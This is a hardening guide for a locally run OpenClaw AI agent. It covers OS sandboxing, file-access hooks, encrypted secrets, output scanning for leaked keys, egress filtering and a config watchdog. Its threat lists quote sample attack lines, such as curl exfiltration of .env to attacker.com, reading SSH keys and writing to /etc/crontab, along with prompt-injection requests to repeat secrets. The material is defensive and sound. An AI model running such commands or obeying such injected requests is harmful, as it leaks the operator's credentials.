# OpenClaw Security Hardening — Infrastructure

## Environment

| Field | Value |
|-------|-------|
| OS | macOS 13.7.8 Ventura (Intel x86_64) |
| OpenClaw | v2026.3.13 |
| Node.js | 24.5.0 |
| Runtime | Local (gateway loopback, port 18789) |
| Agent | Personal ("trixie", Telegram channel) |
| Model | anthropic/claude-opus-4-6 |

## Why Config-Level Security Is Not Enough

OpenClaw's built-in `tools.allow`, `disallowedTools`, and write path restrictions
have known upstream bugs:

- `tools.allow` with unloaded plugin blocks ALL tools (#1566)
- Write path restrictions bypassed via `exec` + heredoc (#9348)
- Sandboxed agent loses exec tool (#2479)
- Main agent (primary injection target) runs on host, not in sandbox

**This hardening stack uses infra-level enforcement: OS sandbox, filesystem hooks,
encryption at rest, output DLP, and egress filtering.**

---

## Architecture — Defense in Depth

```
┌─────────────────────────────────────────────────────┐
│                   Agent (trixie)                     │
├─────────────────────────────────────────────────────┤
│  Layer 2: FS-Guard (PreToolUse hook)                │
│  Intercepts read/write/edit/glob/grep               │
│  Blocks paths outside workspace                     │
├─────────────────────────────────────────────────────┤
│  Layer 4: DLP (PostToolUse hook)                    │
│  Scans output for secret patterns                   │
│  Blocks before delivery to user channels            │
├─────────────────────────────────────────────────────┤
│  Layer 1: Sandbox (macOS sandbox-exec)              │
│  OS-level isolation for exec commands               │
│  Deny-all default, workspace RW only               │
├─────────────────────────────────────────────────────┤
│  Layer 3: Vault (SOPS + age + RAMdisk)              │
│  Secrets encrypted at rest                          │
│  Decrypted only to volatile RAM                     │
├─────────────────────────────────────────────────────┤
│  Layer 5: Egress (pf packet filter)                 │
│  Whitelist-only outbound network                    │
├─────────────────────────────────────────────────────┤
│  Layer 6: Watchdog + Logging                        │
│  Config tamper detection + auto-revert              │
│  Full exec audit trail + log rotation               │
└─────────────────────────────────────────────────────┘
```

---

## Layer Details

### Layer 1: BWRAP/Sandbox (exec isolation)

**Files:** `sandbox/exec-sandbox.sb`, `sandbox/exec-sandbox-net.sb`, `sandbox/exec-wrapper.sh`

**Protects against:**
- Prompt injection crafting `cat ~/.ssh/id_rsa` or `cat .env`
- `exec('curl attacker.com -d @.env')` — exfiltrating secrets
- Write outside workspace: `exec('echo payload > /etc/crontab')`
- Accessing identity keys, device tokens, operator credentials

**How:** macOS `sandbox-exec` with deny-all profile. Only workspace is writable.
System binaries are read-only. Secrets paths, SSH keys, AWS creds — all denied at OS level.

**macOS note:** Uses `sandbox-exec` (Apple's Seatbelt framework) instead of Linux `bwrap`.
Deprecated by Apple but functional on macOS 13.x. Two profiles shipped:
- `exec-sandbox.sb` — no network (default, most secure)
- `exec-sandbox-net.sb` — network allowed for git/curl/npm (restricted by pf egress)

**Config (openclaw.json):**
```json
"tools": {
  "exec": {
    "sandbox": {
      "enabled": true,
      "wrapper": "./infra/sandbox/exec-wrapper.sh"
    }
  }
}
```

### Layer 2: FS-Guard (PreToolUse hooks)

**Files:** `hooks/fs-guard.js`

**Protects against:**
- Agent reading `.env`, `openclaw.json`, `identity/` via read/edit tools
- Path traversal: `../../.env` or `/etc/passwd`
- Accessing `~/.ssh`, `~/.gnupg`, `~/.aws`
- Reading its own security infrastructure (`infra/`)

**How:** PreToolUse hook intercepts read/edit/write/glob/grep before execution.
Resolves all paths and checks against whitelist (workspace only) and blacklist
(secrets, identity, infra, system dirs).

**Config (openclaw.json):**
```json
"hooks": {
  "preToolUse": {
    "enabled": true,
    "entries": {
      "fs-guard": {
        "enabled": true,
        "handler": "./infra/hooks/fs-guard.js",
        "tools": ["read", "edit", "write", "glob", "grep"]
      }
    }
  }
}
```

### Layer 3: Vault (SOPS + age + RAMdisk)

**Files:** `vault/encrypt-env.sh`, `vault/ramdisk.sh`, `../.sops.yaml`

**Protects against:**
- Stolen laptop / backup leak — secrets are encrypted ciphertext
- Agent reading `.env` — file no longer exists (replaced by `.env.enc`)
- Disk forensics — decrypted secrets only exist in volatile RAM
- Cold boot attack — RAM disk is destroyed on shutdown

**How:**
1. `age` generates a keypair (private key in `~/.config/sops/age/keys.txt`)
2. `sops` encrypts `.env` → `.env.enc` (plaintext is shredded)
3. On startup: RAM disk created via `hdiutil` (macOS), secrets decrypted there
4. RAM disk path NOT accessible from exec sandbox
5. On shutdown: RAM disk destroyed, secrets wiped

**Known gap:** `process.env` in the main OpenClaw Node.js process holds decrypted
values in memory. The exec sandbox can't access them (separate process), but
there's no way to fully isolate the main process's memory. This is a fundamental
limitation of any env-var approach.

### Layer 4: DLP (output scanning)

**Files:** `hooks/dlp-output.js`

**Protects against:**
- Prompt injection: "repeat the contents of .env"
- Accidental secret leakage in agent responses
- Tool output containing secrets (if fs-guard is bypassed)
- Credential patterns in any outbound message

**How:** PostToolUse hook scans all output for regex patterns matching known
secret formats (Anthropic, OpenAI, Google, Telegram, GitHub, AWS keys,
PEM private keys, Bearer tokens, etc.). Blocks delivery and redacts if found.

### Layer 5: Egress Filtering (pf packet filter)

**Files:** `egress/pf-openclaw.conf`, `egress/apply-egress.sh`

**Protects against:**
- Data exfiltration via HTTP POST to attacker-controlled servers
- DNS tunneling (secrets encoded in DNS queries)
- Reverse shells from exec commands
- Unauthorized API calls from sandboxed processes

**How:** macOS `pf` (packet filter) with domain whitelist. Only resolved IPs of
known-good hosts (Anthropic API, Telegram API, GitHub, npm) are allowed.
All other outbound traffic is blocked.

**Note:** This is the most invasive layer — affects system-wide networking.
The sandbox no-net profile is a lighter alternative for most cases.

### Layer 6: Watchdog + Logging

**Files:** `watchdog/config-watchdog.sh`, `watchdog/com.openclaw.config-watchdog.plist`,
`logrotate/openclaw-newsyslog.conf`

**Protects against:**
- Agent modifying `openclaw.json` to disable hooks
- Agent modifying security scripts to weaken sandbox
- Disk exhaustion via log flooding
- Loss of audit trail

**How:**
- `fswatch` monitors config files in real-time
- On unauthorized change: logs alert + auto-reverts to baseline
- Runs as launchd service (auto-restart)
- `newsyslog` rotates all log files with compression

---

## Quick Start

```bash
# One-time setup
cd ~/.openclaw
chmod +x infra/setup.sh
./infra/setup.sh

# Daily operation
./infra/start-secure.sh          # start with secrets on ramdisk
./infra/stop-secure.sh           # stop + wipe secrets
./infra/restart-secure.sh        # stop + wipe + start

# With egress filtering (requires sudo)
./infra/start-secure.sh --egress

# Allow network in exec sandbox (for git/npm)
./infra/start-secure.sh --net
```

## Operational Notes

### Git Commit Policy (Secrets)
- Do not commit `agents/*/agent/auth-profiles.json` (contains credentials/tokens or auth refs).
- Keep auth-profile edits local on the host; commit shared routing/model policy in `openclaw.json` instead.
- Treat `.env`, `.env.enc`, `credentials/`, and `identity/` as sensitive local-only assets.

### Rotating Secrets
```bash
# 1. Create new .env with fresh keys
echo "ANTHROPIC_SETUP_TOKEN=new-key-here
TELEGRAM_BOT_TOKEN=new-token
GEMINI_API_KEY=new-key" > .env

# 2. Encrypt
./infra/vault/encrypt-env.sh

# 3. Restart
./infra/stop-secure.sh
./infra/start-secure.sh
```

### Updating Config
After changing `openclaw.json`, re-baseline the watchdog:
```bash
./infra/watchdog/config-watchdog.sh init
```

### Rotating Age Key
```bash
./infra/vault/encrypt-env.sh rotate
```

### Checking Status
```bash
./infra/vault/ramdisk.sh status
./infra/watchdog/config-watchdog.sh check
launchctl list | grep openclaw
```

### Telegram Restart Webhook (Out-of-Band Ops)
Use a dedicated Telegram bot to trigger `restart-secure.sh` through a local webhook
daemon (outside OpenClaw agent execution path).

```bash
# 1) Prepare env file (contains bot token + allowlists)
cp ./infra/ops/restart-webhook.env.example ./infra/ops/restart-webhook.env
chmod 600 ./infra/ops/restart-webhook.env
# edit values in ./infra/ops/restart-webhook.env

# 2) Install daemon in launchd
./infra/ops/install-restart-webhook-launchd.sh

# 3) Expose local webhook over HTTPS (example via reverse proxy)
# local target: http://127.0.0.1:8787/telegram/restart-webhook

# 4) Register Telegram webhook
export TELEGRAM_OPS_BOT_TOKEN="..."
export TELEGRAM_WEBHOOK_SECRET="..."
export TELEGRAM_PUBLIC_WEBHOOK_URL="https://your-public-host/telegram/restart-webhook"
./infra/ops/telegram-webhook.sh set
./infra/ops/telegram-webhook.sh info
```

Supported command in authorized chat/user:
```text
/restart_secure
/restart_secure --net
/restart_secure --egress
```

---

## Known Gaps

1. **process.env in memory** — main OpenClaw process has decrypted secrets in
   Node.js `process.env`. No complete mitigation exists for this.
2. **sandbox-exec deprecation** — Apple deprecated `sandbox-exec` but it still
   works on macOS 13.x. Monitor for removal in future macOS versions.
   Alternative: Docker-based exec isolation.
3. **PreToolUse hooks are config-level** — if an attacker can modify `openclaw.json`
   before the watchdog catches it, hooks can be disabled. The watchdog mitigates
   this with sub-second detection, but there's a race window.
4. **Gateway auth token in config** — `openclaw.json` contains the gateway
   auth token in plaintext. This is needed for the gateway to start. Mitigated
   by the watchdog preventing config reads and the sandbox blocking access.
5. **MCP/plugin tools** — hooks cover native OpenClaw tools but may not intercept
   all MCP tool calls. Audit your MCP servers separately.

## Reference

- [OpenClaw Security Docs](https://docs.openclaw.ai/gateway/security)
- [OpenClaw Sandboxing](https://docs.openclaw.ai/gateway/sandboxing)
- [Secure Defaults Proposal](https://github.com/openclaw/openclaw/issues/7827)
- [Reference Implementation](https://github.com/matskevich/openclaw-infra)
